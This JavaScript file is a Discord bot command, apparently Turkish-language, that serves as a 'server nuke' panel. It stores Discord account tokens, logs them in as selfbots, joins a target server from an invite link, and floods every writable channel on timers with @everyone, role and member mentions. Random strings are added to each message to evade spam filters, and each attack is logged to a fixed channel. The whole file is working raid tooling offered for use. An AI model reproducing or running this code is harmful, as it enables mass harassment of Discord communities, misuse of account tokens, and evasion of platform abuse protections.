const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder } = require('discord.js');
const mongoose = require('mongoose');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');

const Account = mongoose.models.Account || mongoose.model('Account', new mongoose.Schema({ userId: String, token: String, username: String }));
const LOG_CHANNEL_ID = "1537938887509278871"; 

const tempNukeSession = new Map();

async function renderPatlatPanel(userId, guildId) {
    const userAccounts = await Account.find({ userId: userId });
    
    let aktifSayisi = 0;
    userAccounts.forEach(acc => {
        if (global.activeNukes?.has(acc.token)) aktifSayisi++;
    });

    const embed = new EmbedBuilder()
        .setTitle('<a:emoji133:1539424360543293521> Void | Sunucu Patlatma Paneli <a:emoji195:1539424442768424992>')
        .setColor('#2b2d31')
        .setDescription(
            '<a:emoji105:1539424496346206298> **Stealth Nuke Algoritması (Anti-Ban Korumalı)**\n' +
            'Hesaplarınız hedef sunucuya sızar. Spam filtrelerine takılmamak için mesajları şifreleyerek ve yavaşlatarak gönderir.\n\n' +
            `<a:emoji105:1539424496346206298> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
            `<a:emoji105:1539424496346206298> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
            '<a:emoji195:1539424442768424992> *Aşağıdaki butonları kullanarak paneli yönetin.*'
        );

    const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setLabel('Yeni Token Ekle').setStyle(ButtonStyle.Link).setURL(`https://discord.com/channels/${guildId}/1537974081461297162`)
    );
    
    const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('tk_patlat_sec').setLabel('Hesap Seç').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('tk_patlat_hepsi').setLabel('Tüm Hesapları Seç').setStyle(ButtonStyle.Secondary)
    );

    const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('tk_patlat_baslat').setLabel('Başlat').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('tk_patlat_durdur').setLabel('Durdur').setStyle(ButtonStyle.Danger)
    );

    return { embeds: [embed], components: [row1, row2, row3] };
}

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}

module.exports = {
    name: 'patlat', 
    data: new SlashCommandBuilder().setName('patlat').setDescription('Gelişmiş Nuke Paneli'),

    async executeText(message) {
        const infoEmbed = new EmbedBuilder()
            .setTitle('<a:emoji133:1539424360543293521> Void | Sunucu İmha Sistemi <a:emoji195:1539424442768424992>')
            .setDescription('<a:emoji105:1539424496346206298> **Uyarı:** Bu sistem sunucuları felç eder. Ana hesaplarınızı KULLANMAYIN.\n\n<a:emoji195:1539424442768424992> *Paneli açmak için tıklayın.*')
            .setColor('#2b2d31');
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('Paneli Aç').setStyle(ButtonStyle.Secondary).setEmoji('1539424442768424992'));
        await message.channel.send({ embeds: [infoEmbed], components: [row] });
    },

    async handleInteraction(i) {
        const id = i.customId;

        if (id === 'btn_patlat_panel') {
            await i.deferReply({ flags: 64 }).catch(()=>{});
            return i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
        }

        if (id === 'tk_patlat_hepsi') {
            const userAccounts = await Account.find({ userId: i.user.id });
            if (userAccounts.length === 0) return i.reply({ content: '<a:emoji235:1539424382332444732> Kayıtlı tokeniniz yok!', flags: 64 });
            
            tempNukeSession.set(i.user.id, { tokens: userAccounts.map(a => a.token) });
            return i.reply({ content: '<a:emoji133:1539424360543293521> Tüm hesaplar seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
        }

        if (id === 'tk_patlat_sec') {
            const userAccounts = await Account.find({ userId: i.user.id });
            if (userAccounts.length === 0) return i.reply({ content: '<a:emoji235:1539424382332444732> Kayıtlı tokeniniz yok!', flags: 64 });

            const options = userAccounts.map((acc, index) => ({ label: acc.username || `Hesap ${index + 1}`, value: acc.token }));
            const selectMenu = new ActionRowBuilder().addComponents(new StringSelectMenuBuilder().setCustomId('select_patlat_token').setPlaceholder('Kullanılacak hesabı seçin').addOptions(options));
            return i.reply({ content: '<a:emoji105:1539424496346206298> Lütfen saldırıyı yapacak hesabı seçin:', components: [selectMenu], flags: 64 });
        }

        if (id === 'select_patlat_token') {
            tempNukeSession.set(i.user.id, { tokens: [i.values[0]] }); 
            await i.deferUpdate().catch(()=>{});
            return i.followUp({ content: '<a:emoji133:1539424360543293521> Hesap seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
        }

        if (id === 'tk_patlat_baslat') {
            const sessionData = tempNukeSession.get(i.user.id);
            if (!sessionData || sessionData.tokens.length === 0) {
                return i.reply({ content: '<a:emoji235:1539424382332444732> Önce **Hesap Seç** veya **Tüm Hesapları Seç** butonunu kullanarak işlem yapılacak hesapları belirleyin.', flags: 64 });
            }

            const modal = new ModalBuilder().setCustomId('modal_patlat_baslat').setTitle('Hedef Sunucu Ayarları');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('g_invite').setLabel('Davet Linki veya Kodu (örn: discord.gg/void)').setStyle(TextInputStyle.Short).setRequired(true)));
            await i.showModal(modal);
        }

        if (id === 'modal_patlat_baslat') {
            await i.deferUpdate().catch(()=>{});
            let inviteInput = i.fields.getTextInputValue('g_invite');
            let inviteCode = inviteInput.replace('https://discord.gg/', '').replace('discord.gg/', '').replace('https://discord.com/invite/', '');

            const sessionData = tempNukeSession.get(i.user.id);
            if (!sessionData) return;

            let baslatilan = 0;

            for (const token of sessionData.tokens) {
                if (global.activeNukes?.has(token)) continue; 
                
                try {
                    const selfBot = new SelfbotClient({ checkUpdate: false });
                    
                    selfBot.on('ready', async () => {
                        let targetGuildId = inviteCode; 

                        try {
                            const joinRes = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`, {
                                method: 'POST',
                                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                                body: JSON.stringify({})
                            });
                            const joinData = await joinRes.json();
                            if (joinData && joinData.guild) {
                                targetGuildId = joinData.guild.id;
                                await new Promise(r => setTimeout(r, 4000)); 
                            }
                        } catch (err) {}

                        let guild = selfBot.guilds.cache.get(targetGuildId);
                        if (!guild) {
                            try { guild = await selfBot.guilds.fetch(targetGuildId); } catch(e){}
                        }

                        if (!guild) {
                            selfBot.destroy();
                            return; 
                        }

                        const logChannel = i.client.channels.cache.get(LOG_CHANNEL_ID);
                        if (logChannel) {
                            const logEmbed = new EmbedBuilder()
                                .setTitle('<a:emoji133:1539424360543293521> Void | Sunucu İmha Başladı!')
                                .setColor('#2b2d31')
                                .setDescription(
                                    `<a:emoji105:1539424496346206298> **Saldırıyı Başlatan:** \`${i.user.tag}\`\n` +
                                    `<a:emoji105:1539424496346206298> **Hedef Sunucu:** \`${guild.name}\` (\`${guild.id}\`)\n` +
                                    `<a:emoji195:1539424442768424992> **Kullanılan Hesap:** \`${selfBot.user.tag}\`\n\n` +
                                    `*Stealth algoritması çalışıyor, hesap sunucuya başarıyla sızdı.*`
                                )
                                .setThumbnail(guild.iconURL({ dynamic: true }) || i.user.displayAvatarURL({ dynamic: true }))
                                .setTimestamp();
                            logChannel.send({ embeds: [logEmbed] }).catch(()=>{});
                        }

                        let members = [];
                        try { members = Array.from((await guild.members.fetch()).values()); } catch(e){}
                        const roles = guild.roles.cache.filter(r => r.name !== "@everyone");
                        
                        let channels = guild.channels.cache.filter(c => c.isText && c.isText());
                        if (channels.size === 0) channels = guild.channels.cache.filter(c => c.type === 'GUILD_TEXT'); 
                        
                        let nukeIntervals = [];

                        channels.forEach(channel => {
                            const perms = channel.permissionsFor(selfBot.user);
                            if (!perms || !perms.has('SEND_MESSAGES')) return;

                            const canEveryone = perms.has('MENTION_EVERYONE');
                            const slowmode = channel.rateLimitPerUser || 0;

                            let baseText = "";
                            
                            if (canEveryone) {
                                baseText = "@everyone @here \n**VOID GELDİ, SUNUCU PATLIYOR!**";
                            } else {
                                let roleMentions = roles.map(r => `<@&${r.id}>`).join(" ");
                                if (roleMentions.length > 20) {
                                    baseText = roleMentions.substring(0, 500) + "\n**VOID SİZİ BULDU!**";
                                } else {
                                    let userMentions = "";
                                    for(let k = 0; k < 8; k++) { 
                                        if(members.length > 0) userMentions += `<@${members[Math.floor(Math.random()*members.length)].id}> `;
                                    }
                                    baseText = userMentions + "\n**VOID İÇİNİZden GEÇİYOR!**";
                                }
                            }

                            const blast = () => {
                                const hashStart = generateRandomString(4);
                                const hashEnd = generateRandomString(6);
                                channel.send(`\`${hashStart}\` | ${baseText} | \`${hashEnd}\``).catch(()=>{});
                            };

                            const delay = slowmode > 0 ? (slowmode * 1000) + 500 : 2500; 
                            
                            blast();
                            const interval = setInterval(blast, delay);
                            nukeIntervals.push(interval);
                        });

                        global.activeNukes.set(token, { client: selfBot, intervals: nukeIntervals });
                    });
                    
                    await selfBot.login(token);
                    baslatilan++;
                } catch (e) {}
            }
            
            await i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
            if (baslatilan > 0) {
                await i.followUp({ content: '<a:emoji133:1539424360543293521> İşlem **' + baslatilan + '** hesapla başlatıldı. Log kanalını takip edin.', flags: 64 });
            } else {
                await i.followUp({ content: '<a:emoji235:1539424382332444732> Hesaplar sunucuya bağlanamadı. Davet linkini kontrol edin.', flags: 64 });
            }
        }

        if (id === 'tk_patlat_durdur') {
            await i.deferUpdate().catch(()=>{});
            const userAccounts = await Account.find({ userId: i.user.id });
            let durdurulan = 0;

            for (const acc of userAccounts) {
                if (global.activeNukes?.has(acc.token)) {
                    const nukeData = global.activeNukes.get(acc.token);
                    nukeData.intervals.forEach(int => clearInterval(int));
                    try { nukeData.client.destroy(); } catch(e){}
                    global.activeNukes.delete(acc.token);
                    durdurulan++;
                }
            }

            await i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
            if (durdurulan > 0) {
                await i.followUp({ content: '<a:emoji133:1539424360543293521> **' + durdurulan + '** hesabın işlemi başarıyla durduruldu.', flags: 64 });
            } else {
                await i.followUp({ content: '<a:emoji235:1539424382332444732> Şu an aktif bir işlem bulunmuyor.', flags: 64 });
            }
        }
    }
};